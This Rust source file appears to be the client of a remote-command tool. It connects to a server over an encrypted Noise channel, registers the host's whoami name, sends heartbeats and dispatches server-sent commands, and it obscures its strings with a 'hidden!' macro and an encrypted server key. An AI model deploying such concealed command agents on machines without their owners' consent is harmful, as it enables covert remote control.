use crate::context::{Context, Kik, COMMAND_SENDER};
use crate::{cmd_util, read_handle};
use anyhow::Error;
use bytes::BytesMut;
use common::channel::{Channel, ChannelType};
use common::command::Command;
use common::config::Config;
use common::hidden;
use common::kik_info::KikInfo;
use common::ltc_codec::{
    LengthFieldBasedFrameDecoder, CONTROL_MAX_FRAME_LENGTH, INIT_MAX_FRAME_LENGTH,
};
use common::message::init_frame::InitFrame;
use common::noise_transport::connect_kik_noise;
use common::protocol;
use common::protocol::CmdOptions;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::BufReader;
use tokio::sync::mpsc::Sender;
use tokio::sync::{mpsc, Mutex};
use tokio::task::JoinHandle;
use tokio::time;
use tokio::time::timeout;
use tokio_stream::StreamExt;
use tokio_util::codec::FramedRead;

pub async fn kik_conn(context: Context, config: &Config) -> anyhow::Result<JoinHandle<()>> {
    let transport = connect_kik_noise(
        &config.server_host,
        &config.server_port,
        config.read_timeout,
        &common::generated::encrypted_strings::KIK_NOISE_SERVER_PUBLIC_KEY(),
    )
    .await?;
    // Kik 命令通道不传输大块数据，使用控制通道上限减少异常帧的内存影响。
    let framed_read = FramedRead::new(
        BufReader::new(transport.reader),
        LengthFieldBasedFrameDecoder::new_with_max_frame_len(INIT_MAX_FRAME_LENGTH),
    );
    let framed_arc = Arc::new(Mutex::new(framed_read));
    let channel_arc = Arc::new(Mutex::new(Channel::new(
        transport.writer,
        None,
        ChannelType::Unknown,
        transport.local_addr,
        transport.peer_addr,
    )));
    channel_arc
        .lock()
        .await
        .set_write_timeout(config.write_timeout);

    //active逻辑
    let name = cmd_util::whoami();
    let channel = channel_arc.clone();
    handle_active(context.clone(), name.clone(), channel.clone()).await?;

    //tx在连接处理线程结束后被关闭
    let (mut tx, mut rx) = mpsc::channel::<String>(1);

    let context_clone = context.clone();
    let channel_clone = channel_arc.clone();
    let read_timeout = config.read_timeout;
    let handle = tokio::spawn(async move {
        let context = context_clone;
        let channel = channel_clone;
        //执行心跳逻辑
        let chan = channel.clone();
        tokio::spawn(async move {
            heartbeat(chan).await;
        });

        let e = loop {
            // 读锁只包住 next().await，避免 match 臂内处理逻辑被临时锁生命周期拖住。
            let read_result = {
                let mut framed = framed_arc.lock().await;
                timeout(read_timeout, framed.next()).await
            };

            match read_result {
                //timeout返回 Ok说明读取未超时
                Ok(res) => {
                    match res {
                        Some(Ok(msg)) => {
                            //read逻辑
                            let channel = channel.clone();
                            if let Err(error) =
                                handle_read(&context, channel.clone(), msg, &mut tx).await
                            {
                                dev_debug!("读取错误");
                                break Some(error);
                            }
                            if channel.lock().await.channel_type == ChannelType::Kik {
                                framed_arc
                                    .lock()
                                    .await
                                    .decoder_mut()
                                    .set_max_frame_len(CONTROL_MAX_FRAME_LENGTH);
                            }
                            continue;
                        }
                        Some(Err(e)) => {
                            dev_debug!("连接异常:{}", e);
                            break Some(anyhow::Error::new(e));
                        }
                        //对方正常关闭
                        None => {
                            //不在这里对正常关闭进行特殊处理
                            break None;
                        }
                    }
                }
                Err(e) => {
                    break Some(anyhow::Error::new(e));
                }
            };
        };

        if let Some(error) = e {
            let chan = channel.clone();
            handle_error(chan, error).await;
        }
        handle_inactive(context.clone(), channel.clone()).await;
    });

    //这次为第一次rx接收数据,用于阻塞校验
    match timeout(read_timeout, rx.recv()).await {
        Ok(recv) => match recv {
            None => {
                return Err(anyhow::Error::msg(hidden!("校验时连接断开")));
            }
            Some(kik_id) => {
                {
                    let mut guard = channel_arc.lock().await;
                    guard.channel_type = ChannelType::Kik;
                    guard.set_id(kik_id.clone());
                }
                *context.id.lock().await = Some(kik_id);
                context.set_kik(Some(Kik::new(channel_arc.clone()))).await;
            }
        },
        Err(_error) => {
            channel.lock().await.try_write_half_close().await;
            return Err(anyhow::Error::msg(hidden!("服务器超时未响应")));
        }
    };
    Ok(handle)
}

async fn heartbeat(channel: Arc<Mutex<Channel>>) {
    loop {
        time::sleep(Duration::from_secs(5)).await;

        let arc = channel.clone();
        let mut guard = arc.lock().await;
        if guard.is_closed() {
            return;
        }

        // 验证成功才执行
        if guard.channel_type != ChannelType::Unknown {
            match guard.write_and_flush(&protocol::kik_pong()).await {
                Ok(_) => {}
                Err(_) => {
                    break;
                }
            };
        }
    }
}

async fn handle_active(
    context: Context,
    name: String,
    channel: Arc<Mutex<Channel>>,
) -> anyhow::Result<()> {
    // 发送注册请求后仍保持 Unknown；只有收到 KikId，外层状态机才发布 Kik 状态，
    // 避免服务端业务帧早于本地 ID 和命令队列初始化。
    channel
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(InitFrame::KikReq(
            KikInfo {
                id: context.id.clone().lock().await.clone(),
                name,
            },
        )))
        .await?;
    let (tx, mut rx) = tokio::sync::mpsc::channel::<(String, CmdOptions, Command)>(8);
    channel.lock().await.insert_attribute(&COMMAND_SENDER, tx);
    // Sender 绑定在连接属性上；主连接释放后发送端全部销毁，任务会自然退出。
    tokio::spawn(async move {
        while let Some((cmd_id, cmd_options, cmd)) = rx.recv().await {
            read_handle::handle_kik_cmd(context.clone(), &channel, cmd_id, cmd_options, cmd).await;
        }
    });
    Ok(())
}

async fn handle_inactive(context: Context, channel: Arc<Mutex<Channel>>) {
    channel.clone().lock().await.try_write_half_close().await;
    match context.get_kik().await {
        None => {}
        Some(ref kik) => {
            kik.delete_kik_conn().await;
        }
    }
}

async fn handle_error(_channel: Arc<Mutex<Channel>>, _error: Error) {
    dev_debug!("handle_error:{}", _error);
}

async fn handle_read(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
    auth_tx: &mut Sender<String>,
) -> anyhow::Result<()> {
    let channel_type = channel.lock().await.channel_type;
    match channel_type {
        ChannelType::Kik => read_handle::handle_kik(context, channel, msg).await,
        ChannelType::Unknown => {
            read_handle::handle_init_message(context, channel.clone(), msg, auth_tx).await?;
            channel.lock().await.channel_type = ChannelType::Kik;
            Ok(())
        }
        _ => Err(anyhow::Error::msg(hidden!("连接状态与帧类型不匹配"))),
    }
}
